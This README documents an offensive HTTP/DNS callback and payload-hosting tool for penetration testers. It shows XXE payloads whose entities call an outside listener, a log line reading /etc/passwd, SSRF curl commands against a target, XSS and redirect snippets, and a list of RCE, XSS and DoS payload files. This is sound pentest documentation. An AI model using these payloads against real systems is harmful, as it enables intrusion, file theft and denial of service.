# 🧠 Introspector Framework


> **Swiss-Army Knife for deep HTTP exploitation..**


Introspector Framework is a powerful, modular platform designed to help offensive security professionals observe, manipulate, and exploit HTTP-based interactions. It acts as a trap, a dynamic payload host, and a precision response controller — all wrapped in REPL interface, zero noise and total visibility.

---

## 🏗️ Architecture Overview

```
┌─────────────────┐    HTTP/DNS     ┌─────────────────┐
│   Target App    │ ──────────────► │   Introspector  │
│                 │                 │   Framework     │
│ - Web App       │                 │                 │
│ - API Endpoint  │                 │ - HTTP Listener │
│ - XML Parser    │                 │ - DNS Server    │
│ - Image Proc    │                 │ - Payload Host  │
└─────────────────┘                 │ - Log Engine    │
                                     └─────────────────┘
                                             │
                                             ▼
┌─────────────────┐                 ┌─────────────────┐
│   Web UI Logs   │ ◄────────────── │   Callbacks     │
│                 │   Real-time     │                 │
│ - HTTP Requests │                 │ - Timestamps    │
│ - DNS Queries   │                 │ - IP Geolocation │
│ - Full Headers  │                 │ - Request Bodies │
│ - Request Bodies│                 │ - Response Data  │
└─────────────────┘                 └─────────────────┘
```

---

## 🎯 What is Introspector?

* Advanced HTTP/DNS listeners  
* Dynamic payload host  
* Precision-by-Design PoC backend

It's all of them — in one REPL-driven, black-box ready, offensive framework.

---

## 🔥 Key Features

- 🛰️ **Passive HTTP Listener**
  - Captures all HTTP methods from any source
  - Real-time logging: timestamp, IP, headers, path, full body
  - Handles traffic behind proxies (Cloudflare, Akamai, etc.)
  - Save your Introspector session with `--persist` flag

- 🌐 **DNS Listener**
  - UDP DNS server for query logging and callback tracking
  - Supports A record responses and NXDOMAIN modes
  - Generates unique tokens for DNS-based callbacks
  - Real-time DNS query capture with geolocation

- 🔌 **Multi-Port Listening**
  - Launch listeners dynamically: `listen 8080`, `listen 8888`, etc.
  - Supports multiple ports simultaneously (e.g. 80, 8080, 1337)
  - Run callbacks from different attack vectors in parallel
  - View active ports with `system status`

- 🧪 **Run Custom Payloads from the Console**
  - Run modules on demand: `run create xml`, `run create xxe1`, `run create svgbomb`, etc.
  - Generates endpoints like `/run/xyz123.svg` from static templates
  - Served with ready to use Exploits

- 🧬 **Host Custom Server Response**
  - Response Templates loaded from `/hostedfiles/`
  - Host files on demand: `file upload /home/user/iframe.html`, `file upload /root/secret.txt`, etc.
  - Easy to create new response vectors with correct `Content-Type` for exploitation use
  - Supports `.xml`, `.svg`, `.jpg`, `.png`, `.csv`, among others

- 🌑 **Web UI for Logs (Dark Mode)**
  - Access full logs via `/logs-<id>`
  - Displays Request Method, HTTP Headers, URI, and request body in real-time
  - IP Whois and IP Country Auto-Detect
  - DNS query logs integrated with HTTP requests

 - 🔍 **Scan Modules System**
   - Modular scanning framework with controllable detection modules
   - Enable/disable modules on demand: `introspect enable <module>`
   - Currently includes: follow-redirect, delayer, and extensible framework
   - View all modules with `introspect list`

 - 🧭 **Redirect Services**
   - Create tracking redirects: `redirect create <url>`
   - Auto-detect redirect following behavior
   - Log redirect chains and open redirect vulnerabilities

 - ⏱️ **Response Delayer Module**
   - Test client timeout and patience behavior with configurable delays
   - Endpoint: `/delayresponse?t=20` (default 20 seconds)
   - Adjustable delay range: 1-300 seconds
   - Useful for timeout testing and behavior analysis

---

## 📦 Installation

```bash
git clone https://github.com/IntrospectorFramework/Introspector.git
cd introspector-framework
pip3 install -r requirements.txt
sudo python3 Introspector.py
```

---

## ⚡ Quick Start

Get started in 30 seconds with these practical examples:

### 🎯 Blind SSRF Detection with XXE
```bash
# Start Introspector
sudo python3 Introspector.py

# Create XXE payload
[introspector]> run create xxe1
[+] Created /run/x1f92c.xml (Content-Type: application/xml)

# Target the vulnerable endpoint with:
curl -X POST "http://target.com/api" \
  -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://203.0.113.123/run/x1f92c.xml">]><root>&xxe;</root>'

# Watch for callback in logs at http://127.0.0.1/logs-x7j2l9d
```

### 🌐 DNS Callback Tracking
```bash
# Generate unique DNS token
[introspector]> system status
[DNS Example] abc123.introspector.d3.lu

# Use in your payload or SSRF test:
curl "http://target.com/download?url=http://abc123.introspector.d3.lu"

# Monitor DNS queries in real-time
```

### 🧪 Host Malicious Payload
```bash
# Upload custom payload
[introspector]> file upload /root/malicious.svg
[+] Hosted file -> [ ID: 5u8mkt6i ]
 URL: /hostedfiles/5u8mkt6i.svg

# Target application loads:
<img src="http://203.0.113.123/hostedfiles/5u8mkt6i.svg">

# Observe HTTP callback with full headers and body
```

---

### 🚀 Example Session

```
sudo python3 Introspector.py --persist session01
```

```
╔════════════════════════════════════════════════════════════════════╗
║                 INTROSPECTOR FRAMEWORK  —  HTTP OPS TOOL          ║
║           Passive Traps · Callback Intel · Payload Hosting        ║
╚════════════════════════════════════════════════════════════════════╝

[LOG UI] http://127.0.0.1/logs-x7j2l9d
[PORTS] 80
[DNS] ON (udp/53) - Mode: A
[DNS Example] abc123.introspector.d3.lu
[DNS Exception] xyz789.introspector.d3.lu

> **Note:** DNS Example tokens resolve to your server IP (A record), while DNS Exception tokens return NXDOMAIN (non-existent domain) for testing error conditions.
[GEOIP] OK
[PERSIST] ON
[EVENTS] 12
[HOSTED] /hostedfiles/<id>.<ext>

[introspector]> run create svgbomb
[+] Created /run/x1f92c.svg (Content-Type: image/svg+xml)

[introspector]> listen 8888
[+] HTTP listener started on port 8888

[introspector]> system status
[LOG UI] /logs-x7j2l9d
[PORTS] 80, 8888
[DNS] ON (udp/53) - Mode: A
[PERSIST] ON
[EVENTS] 12
[REDIRECTS] 0 active
[HOSTED FILES] 0

[introspector]> file upload /root/iframe.html
[+] Hosted file -> [ ID: 5u8mkt6i ]
 URL: /hostedfiles/5u8mkt6i.html

[introspector]> file list
hosted files:
 - /hostedfiles/5u8mkt6i.html [id: 5u8mkt6i]

 [introspector]> redirect create https://example.com/admin
 [+] Created redirect: /redirect/abc123 -> https://example.com/admin
 
 [introspector]> introspect enable delayer
 [+] Scan module 'delayer' enabled
 
 [introspector]> introspect enable follow-redirect
 [+] Scan module 'follow-redirect' enabled
 
 [introspector]> introspect list
 [+] Available scan modules:
   - follow-redirect: ENABLED
   - delayer: ENABLED
 [+] Total: 2
 
 [introspector]> run list
 [+] Available run payloads:
   - csv             -> tools/simplecsv.csv  (text/csv)
   - csvrce          -> tools/csvrce.csv     (text/csv)
   - csvxss          -> tools/csvxss.csv     (text/csv)
   - jpg             -> tools/simple.jpg     (image/jpeg)
   - jpgpixelflood   -> tools/jpgpixelflood.jpg (image/jpeg)
   - png             -> tools/simple.png     (image/png)
   - svgbomb         -> tools/svgbomb.svg    (image/svg+xml)
   - xml             -> tools/simplexml.xml  (application/xml)
   - xxe1            -> tools/xxe01.xml      (application/xml)
   - xxe2            -> tools/xxe02.xml      (application/xml)
 
 [+] Total: 10
 
 [introspector]> exit
 [!] Exiting...
```

#### 📊 Real Output Examples

**HTTP Callback Captured:**
```
[2024-02-05 14:23:45] HTTP POST /run/x1f92c.svg
IP: 203.0.113.123 (US)
User-Agent: curl/7.68.0
Headers:
  Host: 203.0.113.123
  Content-Type: application/xml
  Content-Length: 245
Body:
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

**DNS Query Captured:**
```
[2024-02-05 14:25:12] DNS Query: abc123.introspector.d3.lu
Type: A
Source: 198.51.100.45 (DE)
Response: 203.0.113.123
```

**Web UI Log Format (/logs-x7j2l9d):**
```json
{
  "timestamp": "2024-02-05T14:23:45Z",
  "type": "http",
  "method": "POST",
  "path": "/run/x1f92c.svg",
  "ip": "203.0.113.123",
  "country": "US",
  "headers": {
    "host": "203.0.113.123",
    "user-agent": "curl/7.68.0",
    "content-type": "application/xml"
  },
  "body": "<?xml version=\"1.0\"?>..."
}

```

---

### 🧠 Available Commands

#### **Framework Commands**
```
run create <payload>    Create payload template
run list            List available payloads
listen <port>         Start HTTP listener
```

#### **Platform Tools**
```
file upload <path>     Host a file
file delete <id>       Delete hosted file by ID
file list            List all hosted files
redirect create <url>   Create redirect URL
redirect delete <id>    Delete redirect by ID
redirect list        List active redirects
```

#### **System Management**
```
system status       Show system info and URLs
system verbose <level> Set verbosity level (0-2)
system persist        Show persistence status
system log-path       Show web UI path
```

#### **Scan Modules / Passive Introspection**
```
introspect <module> <action>   Control scan modules
introspect list                  List all scan modules
Available actions: enable, disable, status
```

#### **Meta Commands**
```
help                 Show this help
exit                  Terminate Introspector
```



---

### 🧬 Available Payloads

| Payload Name | File Template | Attack Type | Typical Use Case |
|--------------|---------------|-------------|------------------|
| xml | simplexml.xml | XML Processing | SSRF, file disclosure |
| xxe1 | xxe01.xml | XXE External Entity | SSRF, file disclosure |
| xxe2 | xxe02.xml | XXE External Entity | SSRF, file disclosure |
| csv | simplecsv.csv | CSV Injection | Data exfiltration |
| csvxss | csvxss.csv | XSS via CSV | Client-side attacks |
| csvrce | csvrce.csv | Remote Code Execution | Command injection |
| jpg | simple.jpg | Image Processing | Bot detection |
| jpgpixelflood | jpgpixelflood.jpg | DoS via Image | Resource exhaustion |
| png | simple.png | Image Processing | Bot detection |
| svgbomb | svgbomb.svg | SVG Bomb | DoS, XXE via SVG |

---


### 🧬 Use Cases

#### 🛰️ Blind SSRF Detection
**Objective:** Detect Server-Side Request Forgery vulnerabilities in restricted networks

**Commands:**
```bash
[introspector]> run create xxe1
[+] Created /run/x1f92c.xml (Content-Type: application/xml)

[introspector]> system status
[DNS Example] abc123.introspector.d3.lu
```

**Test Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "http://203.0.113.123/run/x1f92c.xml">]>
<root>&xxe;</root>
```

**What to Observe:**
- HTTP callback with full headers and body
- Timestamp and source IP geolocation
- XML parser behavior and error messages

**Success Indicators:**
- Callback received from target server IP
- XML parsing errors in logs
- File disclosure attempts in request body

---

#### 🌐 DNS-Based Callback Tracking
**Objective:** Track out-of-band data exfiltration via DNS queries

**Commands:**
```bash
[introspector]> system status
[DNS Example] abc123.introspector.d3.lu
[DNS Exception] xyz789.introspector.d3.lu
```

**Test Scenarios:**
```bash
# SSRF via DNS
curl "http://target.com/api?url=http://abc123.introspector.d3.lu"

# XXE via DNS
<!ENTITY xxe SYSTEM "http://abc123.introspector.d3.lu/data">

# Error condition testing
curl "http://target.com/api?url=http://xyz789.introspector.d3.lu"
```

**What to Observe:**
- DNS query timestamps and source IPs
- Query types (A, AAAA, TXT, etc.)
- Geolocation data for threat intelligence
- NXDOMAIN responses for error testing

**Success Indicators:**
- DNS queries from target infrastructure
- Unique tokens in subdomains for tracking
- Query patterns indicating automated tools

---

#### 🎯 Redirect Exploitation
**Objective:** Test open redirect vulnerabilities and redirect chains

**Commands:**
```bash
[introspector]> redirect create https://example.com/admin
[+] Created redirect: /redirect/abc123 -> https://example.com/admin

[introspector]> redirect list
Active redirects:
- /redirect/abc123 -> https://example.com/admin [id: abc123]
```

**Test Scenarios:**
```bash
# Basic redirect test
curl "http://target.com/redirect?url=http://203.0.113.123/redirect/abc123"

# JavaScript redirect test
<script>window.location="http://203.0.113.123/redirect/abc123";</script>
```

**What to Observe:**
- Redirect chain logging
- User-Agent strings following redirects
- Timing data for redirect analysis
- HTTP status codes in redirect flow

**Success Indicators:**
- Target follows redirect to sensitive path
- Redirect chain logged completely
- Access to protected endpoints via redirect

---

#### 💥 Payload Delivery for Injection Attacks
**Objective:** Serve malicious payloads for XSS, XXE, and injection testing

**Commands:**
```bash
[introspector]> run create svgbomb
[+] Created /run/x1f92c.svg (Content-Type: image/svg+xml)

[introspector]> run create csvxss
[+] Created /run/k4m92n.csv (Content-Type: text/csv)
```

**Test Scenarios:**
```html
<!-- XSS via SVG -->
<img src="http://203.0.113.123/run/x1f92c.svg" onload="alert(1)">

<!-- CSV Injection -->
<a href="http://203.0.113.123/run/k4m92n.csv">Download Report</a>
```

**What to Observe:**
- Content-Type headers properly set
- Payload rendering in target context
- Client-side execution indicators
- Request headers showing vulnerable applications

**Success Indicators:**
- Payloads served with correct MIME types
- Client-side JavaScript execution
- Application-specific parsing behavior

---

#### 🧪 Live PoC Testing Backend
**Objective:** Real-time proof-of-concept testing without separate infrastructure

**Commands:**
```bash
[introspector]> listen 8080
[+] HTTP listener started on port 8080

[introspector]> file upload /root/custom-payload.html
[+] Hosted file -> [ ID: 5u8mkt6i ]
 URL: /hostedfiles/5u8mkt6i.html
```

**What to Observe:**
- Real-time callback logging
- Multi-port parallel testing
- Custom payload hosting
- Web UI for live monitoring

**Success Indicators:**
- Immediate feedback on payload delivery
- Centralized logging for all attack vectors
- Flexible payload management system

---

#### 🔍 Beacon & Callback Tracking
**Objective:** Detect automated tools, bots, and sandbox environments

**Commands:**
```bash
[introspector]> run create jpg
[+] Created /run/a8b4c2.jpg (Content-Type: image/jpeg)

[introspector]> introspect enable delayer
[+] Scan module 'delayer' enabled
```

**Test Scenarios:**
```html
<!-- Bot detection via image -->
<img src="http://203.0.113.123/run/a8b4c2.jpg">

<!-- Timeout testing -->
<script src="http://203.0.113.123/delayresponse?t=30"></script>
```

**What to Observe:**
- User-Agent patterns for automated tools
- Request timing and behavior analysis
- Sandbox detection via response delays
- IP geolocation for data center identification

**Success Indicators:**
- Automated tool signatures in logs
- Sandbox environment detection
- Timing-based behavior analysis

---

#### 📊 Security Research & Reconnaissance
**Objective:** Passive data collection for threat intelligence

**Commands:**
```bash
[introspector]> system persist
[Persistence] Enabled for session tracking

[introspector]> system log-path
[LOG UI] /logs-x7j2l9d
```

**What to Observe:**
- Long-term traffic patterns
- Geographic distribution of sources
- Tool and framework identification
- Vulnerability scanning signatures

**Success Indicators:**
- Comprehensive traffic analysis
- Threat actor attribution data
- Vulnerability research insights

---

#### ⏱️ Timeout and Behavior Analysis
**Objective:** Test client timeout thresholds and connection persistence

**Commands:**
```bash
[introspector]> introspect enable delayer
[+] Scan module 'delayer' enabled

# Test endpoint: /delayresponse?t=20
```

**Test Scenarios:**
```bash
# Various timeout tests
curl "http://203.0.113.123/delayresponse?t=5"   # 5 second delay
curl "http://203.0.113.123/delayresponse?t=30"  # 30 second delay
curl "http://203.0.113.123/delayresponse?t=120" # 2 minute delay
```

**What to Observe:**
- Client timeout behavior
- Connection persistence patterns
- Retry logic implementation
- Error handling mechanisms

**Success Indicators:**
- Identified timeout thresholds
- Connection behavior analysis
- Retry pattern documentation

---

#### 🔍 Modular Detection Framework
**Objective:** Extend detection capabilities with custom modules

**Commands:**
```bash
[introspector]> introspect list
[+] Available scan modules:
   - follow-redirect: ENABLED
   - delayer: ENABLED

[introspector]> introspect enable <custom-module>
[+] Scan module 'custom-module' enabled
```

**What to Observe:**
- Module status and availability
- Custom detection logic integration
- Extensible framework capabilities
- Module-specific logging

**Success Indicators:**
- Custom modules functioning correctly
- Extended detection capabilities
- Framework flexibility demonstrated

---

## 🔧 Troubleshooting

### ❓ Frequently Asked Questions

**Q: Port 80 is already in use. How can I use different ports?**
```bash
# Use alternative ports
sudo python3 Introspector.py --ports 8080,8888,1337

# Or start with specific port
[introspector]> listen 8080
[+] HTTP listener started on port 8080
```

**Q: DNS queries aren't working. What could be wrong?**
- Some ISPs block custom DNS servers on port 53
- Corporate firewalls may block UDP port 53
- Try using alternative DNS ports or VPN
- Check if port 53 is already in use: `sudo netstat -ulnp | grep 53`

**Q: I'm getting "Permission denied" errors.**
```bash
# Ensure proper privileges for low-numbered ports
sudo python3 Introspector.py

# Check if another process is using the port
sudo lsof -i :80
sudo lsof -i :53
```

**Q: Callbacks aren't being received. What should I check?**
- Verify target can reach your server IP
- Check firewall rules: `sudo ufw status`
- Test connectivity: `curl http://your-server-ip/run/test-payload`
- Ensure ports are properly forwarded in NAT environments

**Q: Web UI isn't loading or showing logs.**
```bash
# Check log path with system status
[introspector]> system status
[LOG UI] /logs-x7j2l9d

# Verify persistence is enabled if needed
[introspector]> system persist
[PERSIST] ON
```

**Q: How do I stop all listeners cleanly?**
```bash
[introspector]> system status
[PORTS] 80, 8080, 8888

[introspector]> exit
[!] Exiting... (all listeners stopped automatically)
```

**Q: DNS tokens aren't resolving.**
- Verify DNS server is running: `sudo netstat -ulnp | grep 53`
- Check DNS mode: `system status` should show `[DNS] ON (udp/53)`
- Test with: `nslookup abc123.introspector.d3.lu 127.0.0.1`

**Q: Files aren't uploading correctly.**
```bash
# Check file path exists
[introspector]> file upload /root/test.txt
[ERROR] File not found: /root/test.txt

# Use absolute paths
[introspector]> file upload /home/user/payload.html
[+] Hosted file -> [ ID: 5u8mkt6i ]
```

---

### ⚙️ Configuration Options

```bash
python3 Introspector.py --help
```

| Flag | Example | Use Case | Description |
|------|---------|----------|-------------|
| `--log-path` | `--log-path custom-logs` | Custom deployment | Override default log path for specific naming conventions |
| `--ports` | `--ports 8080,8888,1337` | Port conflicts | Use alternative ports when 80/53 are occupied |
| `--persist` | `--persist session01` | Long-term testing | Maintain logs between restarts for extended pentests |
| `--verbose` | `--verbose` or `-vv` | Debugging | Enable detailed logging for troubleshooting |
| `--help` | `--help` | Reference | Show all available options and defaults |

#### Common Usage Scenarios:

**Development/Testing:**
```bash
# Quick test with alternative ports
python3 Introspector.py --ports 8080,8888 --verbose
```

**Production Pentest:**
```bash
# Persistent session for multi-day engagement
sudo python3 Introspector.py --persist client-pentest-2024
```

**Custom Deployment:**
```bash
# Custom log path for integration with existing tools
sudo python3 Introspector.py --log-path security-monitor --ports 80,443
```

**Debug Mode:**
```bash
# Full verbosity for troubleshooting
python3 Introspector.py --verbose --verbose --ports 8080
```
---

## ⚖️ Security & Legal

> **⚠️ IMPORTANT DISCLAIMER**

**Authorized Use Only:** This tool is designed for authorized security testing, penetration testing, and security research purposes only. Never use Introspector Framework on systems or networks without explicit written permission from the system owner.

**Public Exposure Warning:** Do not expose Introspector Framework to the public internet without proper security controls. The tool is designed for controlled testing environments and may be vulnerable to unauthorized access if exposed.

**Privilege Requirements:** 
- Ports < 1024 require root/sudo privileges
- DNS server (port 53) requires elevated privileges
- Always use the minimum privilege level necessary for your testing

**Legal Compliance:** Users are responsible for ensuring compliance with all applicable laws and regulations in their jurisdiction. The authors assume no liability for misuse or illegal activities.

---
